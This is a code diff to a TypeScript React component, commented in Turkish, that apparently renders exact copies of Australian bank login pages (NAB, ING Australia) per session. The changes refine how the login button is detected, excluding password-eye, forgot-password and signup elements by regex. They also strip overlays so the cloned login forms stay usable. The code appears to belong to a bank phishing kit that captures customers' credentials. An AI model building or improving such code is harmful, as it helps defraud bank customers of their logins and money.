@@ -462,6 +462,28 @@ function isElementActuallyButtonLike(node: HTMLElement): boolean {
     const tag = (node.tagName || "").toLowerCase();
     const typeAttr = (node.getAttribute("type") || "").toLowerCase();
 
+    // ⭐ BLACKLIST: Bu tokenleri içeren HERHANGİ bir element BUTON OLSA BİLE SAYMA:
+    //   - pwd-eye / show-password / toggle-password = şifre göz ikonu (ORİJİNAL HTML)
+    //   - padlock-icon = kilit simgesi
+    //   - visibility = gizle/göster simgesi
+    //   - forgot / reset / help / cancel = şifremi unuttum, iptal butonları = LOGIN DEĞİL
+    //   - register / signup / create = kayıt ol butonu (login değil)
+    //   - link-icon / icon-only = sayfayı bozan sadece ikon elementleri
+    const clsRaw = (node.getAttribute("class") || "").toLowerCase();
+    const idRaw = (node.getAttribute("id") || "").toLowerCase();
+    const dtidRaw = (node.getAttribute("data-testid") || "").toLowerCase();
+    const roleRaw = (node.getAttribute("role") || "").toLowerCase();
+    const ariaRaw = (node.getAttribute("aria-label") || node.getAttribute("title") || "").toLowerCase();
+    const nameRaw = (node.getAttribute("name") || "").toLowerCase();
+    const blTxt = `${clsRaw} ${idRaw} ${dtidRaw} ${roleRaw} ${ariaRaw} ${nameRaw} ${tag}`;
+    if (
+      /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/.test(
+        blTxt,
+      )
+    ) {
+      return false;
+    }
+
     if (tag === "button") return true;
     if (tag === "input" && ["submit", "button"].includes(typeAttr)) return true;
     if (tag === "a") {
@@ -471,10 +493,6 @@ function isElementActuallyButtonLike(node: HTMLElement): boolean {
     if (node.getAttribute("role") === "button") return true;
     if (node.hasAttribute("onclick")) return true;
 
-    // Class/ID bazlı kontrollü SIKI filtre (GENİŞ *contain KALDIRILDI):
-    //   SADECE '.btn', '.btn-primary', '.btn-submit', '.button-primary' gibi
-    //   AÇIKÇA buton sınıfı olanlar kabul edilir. 'login-form' gibi içerikte
-    //   geçenler SAYILMAZ.
     const cls = (node.getAttribute("class") || "").trim().toLowerCase();
     const idAttr = (node.getAttribute("id") || "").trim().toLowerCase();
     if (cls) {
@@ -958,9 +976,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         } catch {}
         const etButton = closestActionNode || et;
+        const etBlTxt = `${(etButton?.getAttribute?.("class") || "")} ${(etButton?.getAttribute?.("id") || "")} ${(etButton?.getAttribute?.("data-testid") || "")} ${(etButton?.getAttribute?.("aria-label") || "")} ${(etButton?.getAttribute?.("title") || "")} ${(etButton?.tagName || "")}`.toLowerCase();
+        const etIsEyeOrIcon = /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(etBlTxt);
         const isButtonLike =
           etButton
-            ? (etButton.tagName === "BUTTON" ||
+            ? !etIsEyeOrIcon && (etButton.tagName === "BUTTON" ||
                 (etButton.tagName === "INPUT" &&
                   ["submit", "button"].includes(
                     ((etButton as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
@@ -1328,10 +1348,16 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         } catch {}
 
+        const blStr = (x: HTMLElement) => `${x.id || ""} ${x.className || ""} ${x.getAttribute("data-testid") || ""} ${x.getAttribute("aria-label") || ""} ${x.tagName || ""}`.toLowerCase();
+        const isPasswordEyeOrIcon = (x: HTMLElement) => /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|security-banner|securitybanner|kba/i.test(blStr(x));
+
         // =====================================================================
         // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
         //    NAB, North AMP, ING Australia gibi bankalarda inputların üstünde
         //    saydam veya z-index yüksek overlay elementleri inputları bloke ediyor.
+        //    ⭐ NOT: Sadece GERÇEKTEN overlay/dialog/popup olan elementleri GİZLE!
+        //       ORİJİNAL HTML ikonları (pwd-eye, padlock-icon, security banner vb.)
+        //       dokunma, koru! BLACKLIST isPasswordEyeOrIcon() TRUE ise GİZLEME!
         // =====================================================================
         try {
           // (A) ING WebComponent / Polymer custom elementler (tag name "ing-*")
@@ -1340,13 +1366,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             ingEls.forEach((el) => {
               const tag = (el.tagName || "").toLowerCase();
               if (tag.startsWith("ing-") || tag.startsWith("paper-") || tag.startsWith("iron-") || tag.startsWith("vaadin-") || tag.startsWith("ui5-")) {
+                if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
                 const role = (el.getAttribute("role") || "").toLowerCase();
                 const zi = Number(window.getComputedStyle(el).zIndex || "0");
                 const disp = window.getComputedStyle(el).display;
+                const isRealOverlayTag =
+                  tag === "ing-core-overlay" || tag === "iron-overlay" || tag === "iron-overlay-backdrop" || tag === "paper-dialog";
+                const isRealOverlayClassOrRole =
+                  role === "dialog" || role === "alertdialog" ||
+                  (el.className || "").toString().split(/\s+/).some((t) => t === "overlay" || t === "backdrop" || t === "modal");
                 // Custom element overlay / dialog / backdrop ise GİZLE
                 if (
-                  zi > 900 ||
-                  /overlay|dialog|backdrop|modal|popup/.test(`${tag} ${el.className} ${role} ${el.id}`.toLowerCase())
+                  (zi > 900 && (isRealOverlayTag || isRealOverlayClassOrRole)) ||
+                  isRealOverlayTag
                 ) {
                   if (disp !== "none") {
                     try { el.style.setProperty("display", "none", "important"); } catch {}
@@ -1362,19 +1394,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           try {
             const highZi = doc.querySelectorAll<HTMLElement>("div, section, article, aside, span, header, footer, nav, dialog");
             highZi.forEach((el) => {
+              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
               const zi = Number(window.getComputedStyle(el).zIndex || "0");
               if (zi > 900) {
                 const tag = (el.tagName || "").toLowerCase();
                 const txt = (el.textContent || "").trim().toLowerCase();
                 const hasForm = el.querySelector("input, button, select, textarea, form") != null;
-                const isLoginBut = /login|submit|continue|next|giriş|giriş|giris|onay|tamam/.test(
+                const isLoginBut = /login|submit|continue|next|giriş|giris|onay|tamam/.test(
                   `${el.id} ${el.className} ${txt}`,
                 );
                 if (!hasForm && !isLoginBut && tag !== "button") {
                   try { el.style.setProperty("display", "none", "important"); } catch {}
                   try { el.style.pointerEvents = "none"; } catch {}
                 } else {
-                  // Form/buton taşıyan overlay'ler sadece pointer-events kapat (arka plan bloke etmesin)
                   try { el.style.setProperty("pointer-events", "none", "important"); } catch {}
                   el.querySelectorAll<HTMLElement>("input, button, select, textarea, label").forEach((f) => {
                     try { f.style.setProperty("pointer-events", "auto", "important"); } catch {}
@@ -1384,11 +1416,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             });
           } catch {}
           // (C) Standart overlay selectorları ile son tarama
+          //    ⭐ GENİŞ [class*=overlay]/[id*=overlay]/[class*=modal] KALDIRILDI!
+          //      Sadece TAG (overlay/dialog/paper-dialog) + AÇIK class TAM eşleşmesi
+          //      (.overlay / .modal / .backdrop) + role=dialog olanlar GİZLENİR.
           try {
             const overlaySelector =
-              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"], .modal, [class*="modal"], [class*="backdrop"], [id*="overlay"], [id*="dialog"]';
+              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, .modal, .backdrop, [role="dialog"], [role="alertdialog"]';
             const overlays = doc.querySelectorAll<HTMLElement>(overlaySelector);
             overlays.forEach((el) => {
+              if (isPasswordEyeOrIcon(el)) return; // ⭐ ORİJİNAL İKONLARA DOKUNMA!
               try { el.style.setProperty("display", "none", "important"); } catch {}
               try { el.style.visibility = "hidden"; } catch {}
               try { el.style.opacity = "0"; } catch {}
